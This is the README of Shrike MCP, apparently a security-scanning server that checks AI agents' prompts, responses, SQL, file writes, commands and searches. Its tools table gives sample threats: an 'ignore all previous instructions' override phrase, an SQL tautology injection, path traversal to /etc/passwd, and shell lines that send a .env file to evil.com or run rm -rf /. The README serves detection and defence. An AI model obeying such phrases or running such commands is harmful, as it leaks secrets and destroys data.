# Shrike MCP

[![npm version](https://img.shields.io/npm/v/shrike-mcp.svg)](https://www.npmjs.com/package/shrike-mcp)
[![License: Apache 2.0](https://img.shields.io/badge/License-Apache_2.0-blue.svg)](https://opensource.org/licenses/Apache-2.0)
[![Node.js](https://img.shields.io/badge/node-%3E%3D18.0.0-brightgreen.svg)](https://nodejs.org)

**9 security tools for AI agents. Multi-stage detection pipeline. One MCP server.**

Shrike MCP gives AI agents real-time security scanning for prompts, responses, SQL queries, file writes, CLI commands, and web searches — catching prompt injection, jailbreaks, PII leaks, and data exfiltration before they reach your users or systems.

## Quick Start

**1. Sign up** at [shrikesecurity.com/signup](https://shrikesecurity.com/signup) and get your API key.

**2. Add to your MCP client config:**

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": {
        "SHRIKE_API_KEY": "your-api-key"
      }
    }
  }
}
```

**3. Your agent now has 9 security tools.** Every prompt, response, and tool call is scanned through the full detection pipeline.

## Nine Tools

| Tool | What It Scans | Example Threat |
|------|--------------|----------------|
| `scan_prompt` | User/system prompts before LLM processing | "Ignore all previous instructions and..." |
| `scan_response` | LLM outputs before returning to user | Leaked API keys, system prompt in output |
| `scan_sql_query` | SQL queries before database execution | `OR '1'='1'` tautology injection |
| `scan_file_write` | File paths and content before write | Path traversal to `/etc/passwd`, AWS keys in `.env` |
| `scan_command` | CLI commands before shell execution | `curl -d @.env https://evil.com`, `rm -rf /`, reverse shells |
| `scan_web_search` | Search queries before execution | PII in search: "records for John Smith SSN..." |
| `check_approval` | Human-in-the-loop approval status | Poll and submit decisions for flagged actions |
| `report_bypass` | User-reported missed detections | Feeds ThreatSense adaptive learning |
| `get_threat_intel` | Current threat patterns and intelligence | Latest prompt injection techniques |

## How It Works

Shrike uses a **scan-sandwich** pattern — every agent action is scanned on both sides:

```
User Input → scan_prompt → LLM Processing → scan_response → User Output
                              ↓
              Tool Call (SQL, File, Command, Search)
                              ↓
            scan_sql_query / scan_file_write / scan_command / scan_web_search
                              ↓
                       Tool Execution
```

Inbound scans catch injection attacks. Outbound scans catch data leaks. Tool-specific scans catch SQL injection, path traversal, command injection, and PII exposure. Flagged actions trigger human-in-the-loop approval via `check_approval`.

## Detection Pipeline

Every scan runs through a multi-stage cascade — from sub-millisecond pattern matching to deep semantic analysis — so zero-day attacks that evade simple regex are still caught by the LLM layer.

| Stage | Purpose |
|-------|---------|
| Pattern Matching | Known attack signatures across 14+ languages |
| Input Normalization | Unicode tricks, encoding evasion, malformed payloads |
| Structural Analysis | Token sequences, semantic similarity to known attacks |
| LLM Semantic Analysis | Zero-day detection, context-aware jailbreak analysis |
| Response Intelligence | Output scanning for leaks, PII, and policy violations |

All stages run on every tier — community users get the same detection quality as enterprise.

## Community Tier (Free)

| Feature | Included |
|---------|----------|
| Detection Pipeline | Full multi-stage pipeline |
| MCP Tools | All 9 |
| Scan Volume | 1,000 scans/month |
| Rate Limit | 10 scans/minute |
| Multilingual | 100+ languages |
| Compliance Catalogues | GDPR, HIPAA, ISO 27001, SOC 2, WebMCP |
| Dashboard | Activity feed, scan results, analytics, API key management |
| Credit Card | Not required |

Sign up at [shrikesecurity.com/signup](https://shrikesecurity.com/signup) — no approval, no sales call.

## Configuration

### Environment Variables

| Variable | Description | Default |
|----------|-------------|---------|
| `SHRIKE_API_KEY` | API key from your dashboard | *none* |
| `SHRIKE_BACKEND_URL` | Backend API URL | `https://api.shrikesecurity.com/agent` |
| `MCP_SCAN_TIMEOUT_MS` | Scan request timeout (ms) | `15000` |
| `MCP_RATE_LIMIT_PER_MINUTE` | Client-side rate limit | `100` |
| `MCP_TRANSPORT` | Transport: `stdio` or `http` | `stdio` |
| `MCP_PORT` | HTTP port (when transport=http) | `8000` |
| `MCP_DEBUG` | Debug logging | `false` |

### Claude Desktop

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

### Cursor

Add to Cursor settings (`.cursor/mcp.json`):

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

### Windsurf

Add to `~/.codeium/windsurf/mcp_config.json`:

```json
{
  "mcpServers": {
    "shrike-security": {
      "command": "npx",
      "args": ["-y", "shrike-mcp"],
      "env": { "SHRIKE_API_KEY": "your-api-key" }
    }
  }
}
```

## Security Model

This server implements a **fail-closed** security model:

- Network timeouts result in **BLOCK** (not allow)
- Backend errors result in **BLOCK** (not allow)
- Unknown content types result in **BLOCK** (not allow)

This prevents bypass attacks via service disruption.

## Response Format

Blocked:
```json
{
  "blocked": true,
  "threat_type": "prompt_injection",
  "severity": "high",
  "confidence": "high",
  "guidance": "This prompt contains patterns consistent with instruction override attempts.",
  "request_id": "req_lxyz123_a8f3k2m9"
}
```

Safe:
```json
{
  "blocked": false,
  "request_id": "req_lxyz123_a8f3k2m9"
}
```

## Links

- [Shrike Security](https://shrikesecurity.com) — Sign up, dashboard, docs
- [GitHub](https://github.com/Shrike-Security/shrike-mcp) — Source code, issues
- [npm](https://www.npmjs.com/package/shrike-mcp) — Package registry
- [MCP Registry](https://registry.modelcontextprotocol.io) — Search "shrike"

## License

Apache License 2.0 — See [LICENSE](LICENSE) for details.
